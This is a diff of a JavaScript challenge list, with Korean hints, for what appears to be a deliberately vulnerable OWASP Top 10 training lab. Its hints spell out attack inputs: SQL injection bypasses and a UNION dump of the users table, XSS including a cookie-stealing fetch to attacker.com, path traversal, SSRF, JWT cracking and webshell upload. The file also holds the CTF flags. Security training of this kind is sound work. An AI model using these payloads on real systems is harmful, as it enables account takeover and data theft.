@@ -11,7 +11,7 @@ const challenges = [
       '/dashboard/account/1 에 접근해보면 어떨까요?',
       '서버에서 현재 로그인한 사용자와 요청한 ID를 비교하는 코드가 없습니다.'
     ],
-    flag: 'PRAVANG{IDOR_account_access_1337}'
+    flag: 'AXIO{IDOR_account_access_1337}'
   },
   {
     id: 'A01-2',
@@ -25,7 +25,7 @@ const challenges = [
       'URL에 쿼리 파라미터를 추가해보세요.',
       '/admin?role=admin 으로 접근해보세요.'
     ],
-    flag: 'PRAVANG{broken_access_control_admin_bypass}'
+    flag: 'AXIO{broken_access_control_admin_bypass}'
   },
   {
     id: 'A02-1',
@@ -39,7 +39,7 @@ const challenges = [
       'SELECT * FROM users 쿼리를 실행해보세요.',
       '일부 비밀번호는 평문, 일부는 MD5 해시로 저장되어 있습니다.'
     ],
-    flag: 'PRAVANG{weak_crypto_md5_plaintext}'
+    flag: 'AXIO{weak_crypto_md5_plaintext}'
   },
   {
     id: 'A03-1',
@@ -53,7 +53,7 @@ const challenges = [
       "username 필드에 SQL 주석을 활용해보세요.",
       "username: admin'-- 또는 admin'/*"
     ],
-    flag: 'PRAVANG{sqli_login_bypass_success}'
+    flag: 'AXIO{sqli_login_bypass_success}'
   },
   {
     id: 'A03-2',
@@ -67,7 +67,7 @@ const challenges = [
       '<script>alert(1)</script> 를 댓글로 작성해보세요.',
       'img 태그의 onerror 속성도 활용 가능합니다.'
     ],
-    flag: 'PRAVANG{stored_xss_in_comments}'
+    flag: 'AXIO{stored_xss_in_comments}'
   },
   {
     id: 'A04-1',
@@ -81,7 +81,7 @@ const challenges = [
       'amount 파라미터에 음수 값을 전송해보세요.',
       'Burp Suite로 요청을 가로채 amount=-1000000 으로 변조해보세요.'
     ],
-    flag: 'PRAVANG{insecure_design_negative_transfer}'
+    flag: 'AXIO{insecure_design_negative_transfer}'
   },
   {
     id: 'A05-1',
@@ -95,7 +95,7 @@ const challenges = [
       '?file=../../app.js 로 접근해보세요.',
       'package.json에서 사용 중인 라이브러리 버전을 확인할 수 있습니다.'
     ],
-    flag: 'PRAVANG{path_traversal_config_leak}'
+    flag: 'AXIO{path_traversal_config_leak}'
   },
   {
     id: 'A07-1',
@@ -110,7 +110,7 @@ const challenges = [
       '시크릿은 매우 간단한 단어입니다.',
       '크래킹 후 role: admin 으로 토큰을 재서명하세요.'
     ],
-    flag: 'PRAVANG{jwt_weak_secret_cracked}'
+    flag: 'AXIO{jwt_weak_secret_cracked}'
   },
   {
     id: 'A08-1',
@@ -124,7 +124,7 @@ const challenges = [
       'JWT 토큰이 필요합니다. /api/token에서 발급받으세요.',
       '.js 또는 .ejs 파일을 업로드해보세요.'
     ],
-    flag: 'PRAVANG{file_upload_webshell}'
+    flag: 'AXIO{file_upload_webshell}'
   },
   {
     id: 'A09-1',
@@ -138,7 +138,7 @@ const challenges = [
       '출금 후 거래 내역 DB에 로그가 없음을 확인하세요.',
       'transactions 테이블을 조회해보세요.'
     ],
-    flag: 'PRAVANG{no_audit_log_for_withdrawal}'
+    flag: 'AXIO{no_audit_log_for_withdrawal}'
   },
   {
     id: 'A10-1',
@@ -152,7 +152,7 @@ const challenges = [
       'http://localhost:3000 또는 http://127.0.0.1:3000 을 입력해보세요.',
       '내부 관리 API에도 접근해볼 수 있습니다.'
     ],
-    flag: 'PRAVANG{ssrf_internal_access}'
+    flag: 'AXIO{ssrf_internal_access}'
   },
   {
     id: 'A06-1',
@@ -167,7 +167,7 @@ const challenges = [
       'axios 1.6.x 이전 버전에서 SSRF 관련 취약점이 보고된 바 있습니다.',
       '각 패키지의 CVE를 검색해보세요.'
     ],
-    flag: 'PRAVANG{A06_outdated_jwt_cve_2022_23529}'
+    flag: 'AXIO{A06_outdated_jwt_cve_2022_23529}'
   },
   {
     id: 'A04-2',
@@ -182,7 +182,7 @@ const challenges = [
       'role=admin 으로 변경 후 전송해보세요.',
       '변경 후 /admin 페이지에 접근해보세요.'
     ],
-    flag: 'PRAVANG{mass_assignment_role_escalation}'
+    flag: 'AXIO{mass_assignment_role_escalation}'
   },
   {
     id: 'A02-2',
@@ -196,7 +196,7 @@ const challenges = [
       '세션 쿠키만 있으면 비밀번호 변경이 가능합니다.',
       'XSS로 탈취한 세션으로도 비밀번호 변경이 가능합니다.'
     ],
-    flag: 'PRAVANG{no_current_password_verification}'
+    flag: 'AXIO{no_current_password_verification}'
   },
   {
     id: 'A07-2',
@@ -211,7 +211,65 @@ const challenges = [
       'alice의 비밀번호는 흔한 단어입니다. (rockyou.txt 상위권)',
       '/system/login-log 에서 시도 횟수를 확인할 수 있습니다.'
     ],
-    flag: 'PRAVANG{A07_bruteforce_no_lockout}'
+    flag: 'AXIO{A07_bruteforce_no_lockout}'
+  },
+  {
+    id: 'SHOP-A01',
+    category: 'A01 - Broken Access Control (쇼핑몰)',
+    title: '타인의 주문 상세 열람 (IDOR)',
+    description: '자신의 주문이 아닌 다른 사용자의 주문 상세 페이지를 조회해보세요.',
+    target: '/shop/orders/:id',
+    difficulty: 'easy',
+    hints: [
+      '주문 완료 후 URL에서 주문 ID를 확인하세요.',
+      '/shop/orders/1 로 직접 접근해보세요.',
+      '서버에서 주문 소유자를 검증하는 코드가 없습니다.'
+    ],
+    flag: 'AXIO{shop_idor_order_disclosure}'
+  },
+  {
+    id: 'SHOP-A03-XSS',
+    category: 'A03 - Injection (쇼핑몰 XSS)',
+    title: '상품 리뷰 Stored XSS',
+    description: '상품 리뷰에 XSS 페이로드를 삽입하여 다른 사용자의 쿠키를 탈취해보세요.',
+    target: '/shop/product/:id',
+    difficulty: 'easy',
+    hints: [
+      '리뷰 내용이 HTML 이스케이프 없이 출력됩니다.',
+      '<script>alert(document.cookie)</script> 를 리뷰로 작성해보세요.',
+      '<img src=x onerror="fetch(\'http://attacker.com/?c=\'+document.cookie)"> 도 가능합니다.'
+    ],
+    flag: 'AXIO{shop_xss_review_injection}'
+  },
+  {
+    id: 'SHOP-A03-SQLi',
+    category: 'A03 - Injection (쇼핑몰 SQLi)',
+    title: '상품 검색 SQL Injection',
+    description: '상품 검색 기능의 SQL Injection 취약점으로 users 테이블의 데이터를 추출하세요.',
+    target: '/shop?q=',
+    difficulty: 'medium',
+    hints: [
+      '검색어가 SQL 쿼리에 직접 삽입됩니다.',
+      "검색창에 ' OR '1'='1 을 입력해보세요.",
+      "UNION SELECT를 활용해 다른 테이블 데이터를 추출해보세요.",
+      "' UNION SELECT id,username,password,email,role,price,stock,category,image_url FROM users-- 시도"
+    ],
+    flag: 'AXIO{shop_sqli_search_union}'
+  },
+  {
+    id: 'SHOP-A04',
+    category: 'A04 - Insecure Design (쇼핑몰)',
+    title: '장바구니 가격 파라미터 조작',
+    description: '장바구니 추가 시 unit_price를 1원으로 변조하여 상품을 거의 무료로 구매하세요.',
+    target: '/shop/product/:id',
+    difficulty: 'easy',
+    hints: [
+      '상품 상세 페이지의 "장바구니 담기" 폼을 확인하세요.',
+      'unit_price가 hidden input으로 전송됩니다.',
+      'Burp Suite로 요청을 가로채 unit_price=1 로 변조 후 전송하세요.',
+      '장바구니에서 단가가 조작된 것을 확인할 수 있습니다.'
+    ],
+    flag: 'AXIO{shop_price_manipulation}'
   }
 ];
 
